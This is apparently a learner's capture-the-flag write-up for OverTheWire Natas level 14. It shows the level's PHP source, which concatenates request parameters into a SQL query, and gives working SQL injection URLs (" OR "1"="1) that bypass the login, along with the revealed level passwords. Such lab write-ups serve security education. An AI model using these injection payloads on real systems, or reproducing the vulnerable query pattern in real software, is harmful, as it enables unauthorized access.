# Natas Level 13 → Level 14 Misconfigured PHP for SQL Injection

## Previous Flag
<b>z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ</b>

## Goal
Username: natas14<br>
URL: http://natas14.natas.labs.overthewire.org<br>

Username: <br>
Password: <br>
Login

## What I learned
```
Encode strings for URLs, using JavaScript in browser console
encodeURIComponent('" OR "1"="1" -- ') ⭐⭐⭐⭐⭐

@trungdullc ➜ /workspaces/01noobHacker (main) $ node -p 'encodeURIComponent(`" OR "1"="1" -- `)' ⭐⭐⭐⭐⭐

$_REQUEST is a superglobal array that contains data from:
    $_GET
    $_POST
    $_COOKIE

# URL: http://example.com/page.php?name=Alice
echo $_REQUEST['name'];                         # Outputs: Alice
# Note: Better to use $_GET or $_POST

array_key_exists(key, array)            # Checks if a specific key exists in an array (even null)
$data = ['name' => 'Bob', 'age' => null];

if (array_key_exists('age', $data)) {
  echo "Key 'age' exists.";
}

# Deprecated in PHP 5.5+ and removed in PHP 7+ use mysqli or PDO instead
mysql_num_rows(result)                  # Returns number of rows from a SELECT query result

$conn = mysql_connect("localhost", "user", "pass");
mysql_select_db("mydb", $conn);
$result = mysql_query("SELECT * FROM users");

$count = mysql_num_rows($result);
echo "There are $count users.";
```

## Solution
```
Click View source code
http://natas14.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 👀
    if(array_key_exists("debug", $_GET)) { 👀
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

# Useful for seeing what SQL query is sent to database
http://natas14.natas.labs.overthewire.org/index.php?username=&password=&debug ⌨️
Executing query: SELECT * from users where username="" and password=""
Access denied!

# Extra " before: %22, see website administrator forgot to disable PHP error_reporting
http://natas14.natas.labs.overthewire.org/index.php?username=%22hacker&password=hacker&debug ⌨️
Executing query: SELECT * from users where username=""hacker" and password="hacker"

Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24
Access denied!

http://natas14.natas.labs.overthewire.org/index.php?username=hacker&password=hacker%22+OR+%221%22=%221&debug ⌨️
Executing query: SELECT * from users where username="hacker" and password="hacker" OR "1"="1"
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx 🔐

# Note: Removed debug to see if even needed
http://natas14.natas.labs.overthewire.org/index.php?username=hacker&password=hacker%22+OR+%221%22=%221 ⌨️
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx 🔐

http://natas14.natas.labs.overthewire.org/index.php?username=natas14&password=%22%20OR%20%221%22=%221%22%20--%20 ⌨️
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx 🔐
```

## Flag
<b>SdqIqBsFcz3yotlNYErZSZwblkm0lrvx</b>

## Continue
[Continue](./Natas1415.md)